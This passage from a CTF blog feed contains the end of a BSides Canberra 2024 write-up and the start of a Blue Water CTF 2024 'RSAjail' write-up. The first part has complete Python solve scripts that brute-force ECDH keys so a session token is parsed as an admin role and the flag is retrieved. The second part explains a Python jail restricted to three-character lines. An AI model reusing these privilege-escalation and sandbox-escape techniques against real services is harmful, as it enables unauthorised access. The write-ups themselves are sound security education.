            token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
            role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
            if role == spb.ADMIN:
                msg = request_msg(s, sessionId, uid, ceph, sepk)
                print(f&amp;#34;Got the flag: {msg = }&amp;#34;)
                exit()
            else:
                continue

        s.close()


&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;h3 id=&#34;a-better-solution&#34;&gt;A better solution&lt;/h3&gt;
&lt;p&gt;Even though it worked, I thought that brute forcing on remote was probably unintended, and there should&amp;rsquo;ve been some way to brute force locally, but I couldn&amp;rsquo;t see how. Turns out my reading comprehension failed me again - I thought that the server uses the our public key we provided when registering to calculate the shared secret, but actually we provide it with another, ephemeral public key for the session when logging in.&lt;/p&gt;
&lt;p&gt;Since the server provides us with its ephermeral public key alongside the challenge, we can generate private keys and calculate the shared secret locally. If the shared secret ends with &lt;code&gt;|\x01&lt;/code&gt;, we use that public key and send it to the server, which should compute the same shared secret, and give us the flag. This way, we don&amp;rsquo;t need to brute force remote and can get the flag quickly in just one attempt.&lt;/p&gt;
&lt;p&gt;Better solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;413892567&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;413892567&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
&amp;#39;&amp;#39;&amp;#39;

python3 client.py -r arpeeceethree.chal.cybears.io:2323



&amp;#39;&amp;#39;&amp;#39;

from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey



def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, ephemeral_ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ephemeral_ecdh
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    # log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    # log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    # log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

from tqdm import tqdm

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    logging.root.setLevel(logging.ERROR)

    s = remote(host, port)

    # register
    e = create_user()
    uid = register(s,e)

    # login step 1
    (sessionId, chal, sepk) = login(s, uid)
    server_ephemeral_ecdh_pubkey = VerifyingKey.from_string(sepk, NIST256p)

    # generate private keys until shared secret is what we want
    while True:
        client_ephemeral_ecdh = ECDH(curve=NIST256p)
        client_ephemeral_ecdh.generate_private_key()
        
        # calculate shared secret
        client_ephemeral_ecdh.load_received_public_key(server_ephemeral_ecdh_pubkey)
        shared_secret = client_ephemeral_ecdh.generate_sharedsecret_bytes()
        
        token = shared_secret
        token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
        role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
        if role == spb.ADMIN:
            break

    login2(s, e, client_ephemeral_ecdh, sessionId, chal)
    
    msg = request_msg(s, sessionId, uid, client_ephemeral_ecdh, sepk)
    print(f&amp;#34;Got the flag: {msg = }&amp;#34;)



&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;BSides Canberra 2024 was again, a great conference, and &lt;a href=&#34;https://x.com/cybearsctf&#34;&gt;Cybears&lt;/a&gt; hosted another fun CTF! I believe it&amp;rsquo;s truely one of the best conferences out there, and I&amp;rsquo;ll definitely be coming back next year!&lt;/p&gt;
&lt;p&gt;I was able to attend thanks to the &lt;a href=&#34;https://www.bsidesau.com.au/assistance.html&#34;&gt;Assistance Program&lt;/a&gt;, which covered my flights and hotel, so special thanks to Kylie, Silvio and Danielle for making this possible!&lt;/p&gt;
&lt;p&gt;For coming 2nd place, we won $500, and a Dungeons and Dragons lego set! We, alongside the other winning teams, skateboarding dogs and French Roomba, all decided to donate our prize money to the Assistance Program, and we hope this helps other people attend the conference in the future! We&amp;rsquo;re keeping the lego set though :P&lt;/p&gt;
&lt;p&gt;Btw, if you spotted any errors/typos in the blog, or have questions, feel free to DM/ping me on discord &lt;code&gt;thesavageteddy&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/conference.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>RSAjail Writeups - Blue Water CTF 2024</title>
      <link>https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/</link>
      <pubDate>Tue, 15 Oct 2024 22:00:00 +1100</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Last weekend I played &lt;a href=&#34;https://ctftime.org/event/2479&#34;&gt;Blue Water CTF&lt;/a&gt; with my team &lt;a href=&#34;https://ctftime.org/team/160273&#34;&gt;Emu Exploit&lt;/a&gt;. We just mananged to get top 10!&lt;/p&gt;

  &lt;img src=&#34;./img/bw-scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;I wasn&amp;rsquo;t planning on playing CTFs at all, but the series of misc challenges, RSAjail, caught my attention, so I proceeded to spend the entirely of Sunday solving them.&lt;/p&gt;
&lt;p&gt;In this post, I will go through each of the challenges, RSAjail-3, RSAjail-2, and RSAjail-1, all made by &lt;a href=&#34;https://x.com/ah_p_uh&#34;&gt;soon haari&lt;/a&gt;. I recommend reading in order, since some techniques from the previous parts may be used in later parts.&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Last weekend I played &lt;a href=&#34;https://ctftime.org/event/2479&#34;&gt;Blue Water CTF&lt;/a&gt; with my team &lt;a href=&#34;https://ctftime.org/team/160273&#34;&gt;Emu Exploit&lt;/a&gt;. We just mananged to get top 10!&lt;/p&gt;

  &lt;img src=&#34;./img/bw-scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;I wasn&amp;rsquo;t planning on playing CTFs at all, but the series of misc challenges, RSAjail, caught my attention, so I proceeded to spend the entirely of Sunday solving them.&lt;/p&gt;
&lt;p&gt;In this post, I will go through each of the challenges, RSAjail-3, RSAjail-2, and RSAjail-1, all made by &lt;a href=&#34;https://x.com/ah_p_uh&#34;&gt;soon haari&lt;/a&gt;. I recommend reading in order, since some techniques from the previous parts may be used in later parts.&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;

  &lt;img src=&#34;./img/bw-misc.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;h1 id=&#34;rsajail-3---63-solves&#34;&gt;RSAjail-3 - 63 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s learn about RSA!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc rsajail3.chal.perfect.blue 1337&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are given the Python source file that runs on the server:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;634189527&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;634189527&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;rsajail-3.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from subprocess import Popen, PIPE, DEVNULL
from Crypto.Util.number import getPrime
from secret import fname, flag
import time, string, secrets, os

def keygen():
    pr = Popen([&amp;#39;python3&amp;#39;, &amp;#39;-i&amp;#39;], stdin=PIPE, stdout=DEVNULL, stderr=DEVNULL, text=True, bufsize=1)

    p, q = getPrime(1024), getPrime(1024)
    N, e = p * q, 0x10001
    m = secrets.randbelow(N)
    c = pow(m, e, N)

    pr.stdin.write(f&amp;#34;{(N, p, c) = }\n&amp;#34;)
    pr.stdin.write(f&amp;#34;X = lambda m: open(&amp;#39;{fname}&amp;#39;, &amp;#39;w&amp;#39;).write(str(m))\n&amp;#34;)
    # X marks the spot!
    
    return pr, m

def verify(pr, m, msg):
    time.sleep(1)

    assert int(open(fname, &amp;#39;r&amp;#39;).read()) == m
    os.remove(fname)
    pr.kill()

    print(msg)

# Example!
pr, m = keygen()
example = [
    &amp;#34;q = N // p&amp;#34;,
    &amp;#34;phi = (p - 1) * (q - 1)&amp;#34;,
    &amp;#34;d = pow(0x10001, -1, phi)&amp;#34;,
    &amp;#34;m = pow(c, d, N)&amp;#34;,
    &amp;#34;X(m)&amp;#34;
]

for code in example:
    pr.stdin.write(code &amp;#43; &amp;#39;\n&amp;#39;)

verify(pr, m, &amp;#34;I showed you how RSA works, try yourself!&amp;#34;)


# Your turn!
pr, m = keygen()
while code := input(&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;):
    if (len(code) &amp;gt; 3) or any(c == &amp;#34;\\&amp;#34; or c not in string.printable for c in code):
        print(&amp;#39;No hack :(&amp;#39;)
        continue
    pr.stdin.write(code &amp;#43; &amp;#39;\n&amp;#39;)

verify(pr, m, flag)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Basically, it generates RSA values &lt;code&gt;N&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt;, &lt;code&gt;c&lt;/code&gt;, and writes it to a Python interpreter. It also defines the function &lt;code&gt;X(m)&lt;/code&gt; as writing &lt;code&gt;m&lt;/code&gt; to a file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;keygen&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Popen([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;python3&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-i&amp;#39;&lt;/span&gt;], stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;PIPE, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DEVNULL, stderr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DEVNULL, text&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, bufsize&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p, q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;), getPrime(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    N, e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; secrets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randbelow(N)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(m, e, N)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;(N, p, c) &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X = lambda m: open(&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;fname&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;w&amp;#39;).write(str(m))&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# X marks the spot!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pr, m
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Like this:&lt;/p&gt;

  &lt;img src=&#34;./img/t1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;We can input characters into interpreter, and our goal is to decrypt find &lt;code&gt;m&lt;/code&gt; by decrypting &lt;code&gt;c&lt;/code&gt;, and write it to a file. If the written value is equal to &lt;code&gt;m&lt;/code&gt; meaning we successfully decrypted, we get the flag.&lt;/p&gt;
&lt;p&gt;The server gives us an example of how to do this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;example &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;q = N // p&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;phi = (p - 1) * (q - 1)&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d = pow(0x10001, -1, phi)&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m = pow(c, d, N)&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X(m)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It seems simple enough. We find &lt;code&gt;q&lt;/code&gt; by dividing &lt;code&gt;N&lt;/code&gt; by &lt;code&gt;p&lt;/code&gt;, calculate &lt;code&gt;d = pow(e, -1, (p-1)*(q-1))&lt;/code&gt; and &lt;code&gt;m = pow(c, d, N)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;But the trick is, &lt;strong&gt;each line of our input must be 3 characters or less&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Your turn!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pr, m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; keygen()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; code &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (len(code) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; any(c &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; code):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;No hack :(&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    pr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(code &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;verify(pr, m, flag)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You might see why this challenge, the easiest one, is called RSAjail-3 and not RSAjail-1.&lt;/p&gt;
&lt;p&gt;So with the 3 character restriction, my first thought was how to get multiline input. &lt;code&gt;\&lt;/code&gt; is banned, and we also can&amp;rsquo;t use &lt;code&gt;if&lt;/code&gt;/&lt;code&gt;for&lt;/code&gt;/&lt;code&gt;while&lt;/code&gt; statements, since those would be longer than 3 characters.&lt;/p&gt;
&lt;p&gt;But there is something we can use that allows the interpreter to keep taking input for the same chunk of code, despite pressing enter - brackets.&lt;/p&gt;
&lt;p&gt;If you enter any bracket (&lt;code&gt;[&lt;/code&gt;, &lt;code&gt;(&lt;/code&gt; &lt;code&gt;{&lt;/code&gt;), but don&amp;rsquo;t close it, the interpreter will keep requesting input, even newlines, until you close that bracket and any other brackets.&lt;/p&gt;
&lt;p&gt;What&amp;rsquo;s even better is that you can use operators within the brackets, across multiple lines:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
